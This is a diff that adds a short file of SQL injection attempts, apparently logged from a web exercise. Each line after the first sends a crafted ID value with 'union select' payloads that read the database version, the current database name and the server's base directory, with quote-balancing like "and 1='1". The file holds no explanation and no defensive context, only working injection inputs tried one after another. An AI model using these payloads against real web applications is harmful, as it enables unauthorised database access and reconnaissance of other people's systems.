@@ -1,0 +1,18 @@
+ID:1
+ID:1' union select(version()) 
+ID:1' union select(version()) 
+ID:1' union select(version())
+ID:1' union select(version()) 
+ID:1' union select(version())
+ID:1' union select(version())
+ID:1' union select(version())
+ID:1' union select(version()) and 1='1
+ID:1' union select(version()) and 1='1
+ID:1' union select(version()) and 1='1
+ID:1' union select(version()) and 1='1
+ID:1' union select 1,version(),3 and 1='1
+ID:1' union select 1,version(),3 and 1='1
+ID:2' union select 1,version(),3 and 1='1
+ID:26' union select 1,version(),3 and 1='1
+ID:-16' union select 1,database(),3 and 1='1
+ID:-16' union select 1,@@basedir,3 and 1='1
